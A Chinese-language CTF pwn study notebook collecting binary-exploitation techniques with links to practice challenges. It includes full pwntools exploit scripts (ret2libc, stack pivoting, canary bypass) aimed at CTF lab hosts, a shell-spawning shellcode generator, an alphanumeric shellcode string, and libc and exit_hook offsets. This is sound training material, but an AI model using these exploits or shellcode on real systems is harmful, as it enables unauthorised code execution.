# Pwn笔记

1. 程序关闭标准输出会导致getshell后无法得到cat flag的输出。这时可以用命令`exec 1>&0`将标准输出重定向到标准输入，再执行cat flag就能看见了。因为默认打开一个终端后，0，1，2（标准输入，标准输出，标准错误）都指向同一个位置也就是当前终端。详情见这篇[文章](https://blog.csdn.net/xirenwang/article/details/104139866)。例题：[wustctf2020_closed](https://buuoj.cn/challenges#wustctf2020_closed)
2. 做菜单类堆题时，添加堆块的函数一般是最重要的，需要通过分析函数来构建出程序对堆块的安排。比如有些笔记管理题会把笔记名称放一个堆中，笔记内容放另一个堆中，再用一个列表记录指针。了解程序是怎么安排堆后才能根据漏洞制定利用计划。如果分析不出来，用gdb调试对着看会好很多。例题：[babyfengshui](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Pwn/babyfengshui.md)
3. 32位利用A和%p计算格式化字符串偏移+$hn按字节改got表。例题：[axb_2019_fmt32](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/axb_2019_fmt32.md)
4. pwntools生成shellcode

适用于linux。不过我到现在还没见过windows的pwn，可能是windows考的不多吧。

```python
from pwn import *
arch=input("arch? i386/amd64: ")
context(log_level = 'debug', arch = arch[:-1], os = 'linux')
choice=input("shell/orw: ")[:-1]
if choice=="shell":
    shellcode=asm(shellcraft.sh())
    print(shellcode)
else:
    mmap_addr = int(input("hex addr: ")[:-1],16)
    shellcode = shellcraft.open('./flag')
    shellcode += shellcraft.read(3, mmap_addr, 0x30)
    shellcode += shellcraft.write(1, mmap_addr, 0x30)
    print(asm(shellcode))
```

6. pwn 栈题模板

### 64位

- ret2libc+格式化字符串绕canary:[bjdctf_2020_babyrop2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/bjdctf_2020_babyrop2.md)。

- ropchain getshell+溢出绕canary:[rop64](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/rop64.md)。

- ret2libc:[ret2libc](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/ret2libc.md)
- 程序给出buf地址的栈迁移:[actf_2019_babystack](https://blog.csdn.net/mcmuyanga/article/details/112801732)

```python
from pwn import *
context.log_level='debug'
p=remote("node4.buuoj.cn",28412)
leave_ret=0x0000000000400a18
puts_plt=0x400730
puts_got=0x601020
main=0x4008f6
pop_rdi=0x0000000000400ad3
p.sendlineafter(">",str(0xe0))
p.recvuntil('0x')
stack_addr=int(p.recv(12),16)
print(hex(stack_addr))
payload=b'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
payload+=b'a'*(0xd0-len(payload))  #0xd0是buf距离rbp的偏移
payload+=p64(stack_addr)+p64(leave_ret)
p.sendafter(">",payload) #栈迁移提的payload永远用send发送
puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts_addr-526784
one_gadget=libc_base+0x4f2c5
p.sendlineafter(">",str(0xe0))
p.recvuntil('0x')
stack_addr=int(p.recv(12),16)
payload=b'a'*8+p64(one_gadget)
payload+=b'a'*(0xd0-len(payload))
payload+=p64(stack_addr)+p64(leave_ret)
p.sendafter(">",payload)
p.interactive()
```

### 32位

- ret2libc:[pwn-200](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Pwn/pwn-200.md)。

```python
from pwn import *
context.log_level='debug'
write_plt=0x08048370
write_got=0x0804a01c
ret_addr=0x0804847b
payload=b'a'*0x8c+p32(write_plt)+p32(ret_addr)+p32(1)+p32(write_got)+p32(4)
p=remote("node4.buuoj.cn",26320)
p.sendline(payload)
write_addr=u32(p.recv(4))
system_offset=239936
write_offset=869312
bin_sh_offset=0x0015902b
libc_base=write_addr-write_offset
payload=b'a'*0x8c+p32(libc_base+system_offset)+p32(ret_addr)+p32(libc_base+bin_sh_offset)
p.sendline(payload)
p.interactive()
```

- 栈迁移+ret2libc:[[Black Watch 入群题]PWN](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN.md)

- 栈迁移:[ciscn_2019_es_2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/ciscn_2019_es_2.md)

栈迁移分很多种情况。第一种情况：`偏移+栈迁移目标地址-4+leave_ret`，同时目标地址直接写ropchain。第二种情况：`偏移+栈迁移目标地址+leave_ret`，目标地址先根据程序是多少位的填充4或者8个字节，再写ropchain。第三种情况，迁移的目标地址离一些重要地址比较近，比如got表，这时候就要留出一些位置，`偏移+栈迁移目标地址-0xd0+leave_ret`，目标地址先写0xd0+4个偏移再写ropchain；或者`偏移+栈迁移目标地址+leave_ret`，但是目标地址的ropchain前面加上若干个ret，抬高栈。例题：[gyctf_2020_borrowstack](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/gyctf_2020_borrowstack.md)

- 菜单类栈溢出题+canary绕过+ret2libc

```python
from pwn import *
context.log_level='debug'
context(arch='arm64')   #因为下方使用了flat，故此处一定要根据程序的位数填写，这个是64位，32位是i386。如果填写错误会导致下方的flag出错。
p=remote('node4.buuoj.cn',27351)
def Store(content):
    p.recvuntil('>>')
    p.sendline('1')
    p.sendline(content)
 
def Print():
    p.recvuntil('>>')
    p.sendline('2')
 
def Quit():
	p.recvuntil('>>')
	p.sendline('3')
puts_plt=0x00400690
puts_got=0x00600fa8
pop_rdi=0x0000000000400a93
main=0x00400908
payload=b'a'*0x88
Store(payload)
Print()
p.recvuntil('a\n')
canary=p.recv(7).rjust(8,b'\x00')
print(canary)
payload=flat([b'a'*0x88,canary,0,pop_rdi,puts_got,puts_plt,main])
Store(payload)
Quit()
p.recv()
puts=u64(p.recv(6).ljust(8,b'\x00'))
puts_offset=456336
libc_base=puts-puts_offset
binsh=1625431+libc_base
system=283536+libc_base
payload=flat([b'a'*0x88,canary,0,pop_rdi,binsh,system,main])
Store(payload)
Quit()
p.interactive()
```

- srop基础利用。例题:[ciscn_2019_es_7](../../CTF/BUUCTF/Pwn/ciscn_2019_es_7.md)

7. pwntools得到libc偏移

承接rop题模板，给出做题时常见的偏移，上面的脚本中xxx_offset就是这么来的。至于为什么要多此一举打印出来，全是因为我没配置好linux环境。配置好的各位直接要`libc.sym['xxx]`那段就行了。

```python
from pwn import *
libc=ELF("./ubuntu18/libc-2.27.so.64")
print(f"system:{libc.sym['system']}")
print(f"write:{libc.sym['write']}")
print(f"puts:{libc.sym['puts']}")
print(f"/bin/sh:{libc.search(b'/bin/sh').__next__()}")
print(f"free:{libc.sym['free']}")
print(f"__malloc_hook:{libc.symbols['__malloc_hook']}")
print(f"realloc:{libc.symbols['realloc']}")
print(f"printf:{libc.symbols['printf']}")
print(f"__free_hook:{libc.sym['__free_hook']}")
print(f"atoi:{libc.sym['atoi']}")
print(f"__environ:{libc.sym['__environ']}")
print(f"__libc_start_main:{libc.symbols['__libc_start_main']}")
print(f"_IO_2_1_stdin_:{libc.sym['_IO_2_1_stdin_']}")
print(f"setbuffer:{libc.sym['setbuffer']}")       
print(f"_IO_list_all: {libc.symbols['_IO_list_all']}")                                                              
```

8. pwn heap题模板

### 64位

- unsorted bin attack:[hitcontraining_magicheap](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/hitcontraining_magicheap.md)
- Chunk Extend and Overlapping+off by one:[hitcontraining_heapcreator](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/hitcontraining_heapcreator.md)
- 利用Chunk Extend and Overlapping配合unsorted bin泄露地址+fastbin attack修改__malloc_hook:[0ctf_2017_babyheap](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/0ctf_2017_babyheap.md)
- one_gadget失效时利用realloc_hook调整栈+Chunk Extend and Overlapping配合unsorted bin泄露地址+fastbin attack。例题:[roarctf_2019_easy_pwn](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/roarctf_2019_easy_pwn.md)
- unlink更改got表。例题:[hitcontraining_unlink](../../CTF/BUUCTF/Pwn/hitcontraining_unlink.md)
- house of force任意地址写。例题:[hitcontraining_bamboobox](../../CTF/BUUCTF/Pwn/hitcontraining_bamboobox.md)
- uaf改free_hook为system+tcache dup。例题:[ciscn_2019_es_1](../../CTF/BUUCTF/Pwn/ciscn_2019_es_1.md)
- off by one+unlink+格式化字符串泄露地址。例题:[axb_2019_heap](../../CTF/BUUCTF/Pwn/axb_2019_heap.md)
- 劫持_IO_2_1_stdin_结构体里的_fileno使其读取制定文件而不是stdin+只能泄露地址后4字节的解决办法。例题:[](../../CTF/BUUCTF/Pwn/ciscn_2019_final_2.md)
- off by null+Chunk Extend and Overlapping+tcache dup。例题:[hitcon_2018_children_tcache](../../CTF/BUUCTF/Pwn/hitcon_2018_children_tcache.md)
- house of orange+FSOP。例题:[houseoforange_hitcon_2016](../../CTF/BUUCTF/Pwn/houseoforange_hitcon_2016.md)

### 32位

- uaf更改heap数组函数指针:[hacknote](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Pwn/hacknote.md)
- uaf修改程序功能函数指针。例题：[ciscn_2019_n_3](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_n_3.md)


9. 栈溢出[计算偏移量](https://blog.csdn.net/weixin_62675330/article/details/123344386)（gdb，gdb-peda,pwntools cyclic,ida)
10.  手写shellcode。当pwntools自动生成的shellcode过长时，就要手动将shellcode长度缩减。例题：[ciscn_2019_s_9](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/ciscn_2019_s_9.md)
11.  32位&64位系统调用及其[系统调用号](https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/)。
12.  pwntools的sendline和send函数效果不同，sendline会默认在发送的内容后面加上个换行符`\n`。有时候使用不同的会有影响，一个不行可以试试另外的。
13.  纯可见字符shellcode。一般的shellcode都有不可见字符，但有时程序要求只能输入可见字符，这时纯可见字符shellcode就派上用场了。详情请看这篇[文章](http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode)，给出linux，amd64的一个可见字符shellcode：

- Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t

例题:[mrctf2020_shellcode_revenge](https://blog.csdn.net/mcmuyanga/article/details/114828207)

14. 基本格式化字符串漏洞。例题:[inndy_echo](../../CTF/BUUCTF/Pwn/inndy_echo.md)
15. 64位格式化字符串泄露地址+改got表。例题:[axb_2019_fmt64](../../CTF/BUUCTF/Pwn/axb_2019_fmt64.md)
16. [blind pwn](https://www.anquanke.com/post/id/196722#h3-15)（盲打），在不给出原程序的情况下尝试打通程序。
17. orw shellcode构造。例题:[[极客大挑战 2019]Not Bad](../../CTF/BUUCTF/Pwn/[极客大挑战%202019]Not%20Bad.md)
18. stack smash泄露栈上内容+environ环境变量计算栈上变量地址。例题:[wdb2018_guess](../../CTF/BUUCTF/Pwn/wdb2018_guess.md)
19. 在c语言中，无符号变量和有符号变量比较时，会将有符号变量转化为无符号变量来比较。可利用这个特点进行整形溢出，如数字为0的时候，(unsigned int)(0-1)就就是非常大的整数。
20. 就算是32位程序，数组取索引`a[1]`仍然是一个索引对应8个字节。
21. use without initialization漏洞。程序malloc后得到指针在free并设null后，同样应该将指针指向的内容置空，否则可能会导致程序逻辑漏洞。例题:[picoctf_2018_are you root](https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/are%20you%20root.md)
22. calloc不会从tcache bin里取空闲的chunk，而是从fastbin里取，取完后，和malloc一样，如果fastbin里还有剩余的chunk，则全部放到对应的tcache bin里取，采用头插法。头插法会导致chunk->fd被写入heap_x_addr。例题:[gyctf_2020_signin](https://blog.csdn.net/seaaseesa/article/details/104526905)
23. 堆上的格式化字符串漏洞。
- printf的字符串，如果是在堆上，那么就无法在栈上写地址利用%x$hn去修改
- printf会一次性取出所有的偏移的地址，再去修改。不是边写边修改
- 由于ebp寄存器会记录一个栈地址链，所以可以利用这一点特性，爆破修改这个栈地址链的最低字节，然后修改ebp寄存器后4个字节的内容，理想状态下，爆破1个字节即可，而且，所有的地址都是对齐到地址页。
- ALSR : 对于32位的线性地址来说，高四位为全局页表，如果用随机产生会影响对高位内存的映射能力，会产生大量的内存碎片，低12位要考虑页对齐，因而只能有16位来作为偏移量 . 可能不清楚, 举个例子 0x080485AB地址 它只能0x10,0x10的修改. 同时高四位不会被修改, 同时由于页对齐 , 也就意味着只有A 会被随机化. 64位类似.
- %{offest}\$n : 如果有 A->B->C. 那么如果 %{offest}\$n指向A的话, 实际修改的是C.

例题:[xman_2019_format](https://blog.csdn.net/Y_peak/article/details/115327826)

24. ubuntu18中需要[栈平衡](https://blog.csdn.net/qq_41560595/article/details/112161243)（按照16字节对齐）才能正常调用system。例题:[suctf_2018_stack](https://buuoj.cn/challenges#suctf_2018_stack)
25. 程序在推出是会调用fini_array，因此可以通过改fini_array获取一次循环。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，由此无法获得无限循环。例题:[ciscn_2019_sw_1](https://blog.csdn.net/wuyvle/article/details/116310454)
26. strcpy 在复制字符串时会拷贝结束符 '\x00'，比如原字符串长8，strcpy会连着末尾的\x00一起拷贝到目标地址，也就是9个字符，易发生off-by-null。
27. 拟态入门。该类题型会给出两个功能完全相同的程序，还有一个裁决程序，fork出这两个程序，并监听着它们的输出。如果两者输出不一样或者一方崩溃，则裁决程序就会kill掉它们两个，要求我们写出两个程序都共用的exp。例题:[强网杯2019 拟态 STKOF](https://blog.csdn.net/seaaseesa/article/details/105407007)
28. realloc函数下的tcache dup+stdout泄露libc地址。realloc函数相比malloc，有4种情况：

① 当ptr == nullptr的时候，相当于malloc(size)， 返回分配到的地址<br>
② 当ptr != nullptr && size == 0的时候，相当于free(ptr)，返回空指针<br>
③ 当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去<br>
④ 当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面又足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针

利用io file的stdout泄露libc地址则要满足下面的条件：

① 设置_flags & _IO_NO_WRITES = 0<br>
② 设置_flags & _IO_CURRENTLY_PUTTING = 1<br>
③ 设置_flags & _IO_IS_APPENDING = 1<br>
④ 将_IO_write_base设置为要泄露的地方

例题1:[roarctf_2019_realloc_magic](https://blog.csdn.net/qq_35078631/article/details/126913140)。例题2:[de1ctf_2019_weapon](https://www.z1r0.top/2021/10/12/de1ctf-2019-weapon/)。例题2无法直接创建unsorted bin，需要利用uaf和chunk overlap构造出一个unsorted bin里的chunk，然后再io file泄露地址。

29. tcache attack中tcache_perthread_struct的利用。在tcache机制下利用unsorted bin泄露地址时，需要先填满tcache。但有些题会限制free的次数。这时可以尝试利用例如tcache dup这种漏洞，分配到tcache_perthread_struct处，更改tcache bins中chunk的数量和分配地址。tcache_perthread_struct结构体在堆上，大小一般为0x250。它的前64个字节，分别代表0x20\~0x410大小的chunk(包括chunk头)的数量。当超过7（这个值由里面的一个字段决定，如果我们修改这个字段，比如0，就能直接把chunk放入unsorted bin）的时候，再次释放的chunk会被放入到fastbin或者unsorted bin。后面的内存，则分别表示0x20\~0x410大小tcache bins的首地址。首地址如果是一个有效的地址，下一次分配对应大小的chunk会直接从该地址处分配，没有chunk size的检查。例题:[SWPUCTF_2019_p1KkHeap](https://www.cnblogs.com/LynneHuan/p/14589294.html)
30. bss段上的格式化字符串漏洞。和堆上的格式化字符串漏洞一样，都是利用ebp的地址链间接修改got等地址。got表通常是0x80开头，先让ebp指向一个指向0x80地址开头的指针（方便修改），下一次再修改ebp就是修改那个指针，改成system即可getshell。例题:[SWPUCTF_2019_login](https://blog.csdn.net/weixin_46521144/article/details/119567212)
31. [exit_hook](https://www.cnblogs.com/pwnfeifei/p/15759130.html)的[利用](https://www.cnblogs.com/bhxdn/p/14222558.html)。其实没有exit hook，它是函数指针，故无法直接libc.sym找到，只能手动记录值。

```
在libc-2.23中
exit_hook = libc_base+0x5f0040+3848（64）
exit_hook = libc_base+0x5f0040+3856（32）

在libc-2.27中
exit_hook = libc_base+0x619060+3840（64）
exit_hook = libc_base+0x619060+3848（32）
```

只要知道libc版本和任意地址的写，就可以直接写这个指针，执行exit后就可以拿到shell了。（也不用非要执行exit函数，程序正常返回也可以执行到这里）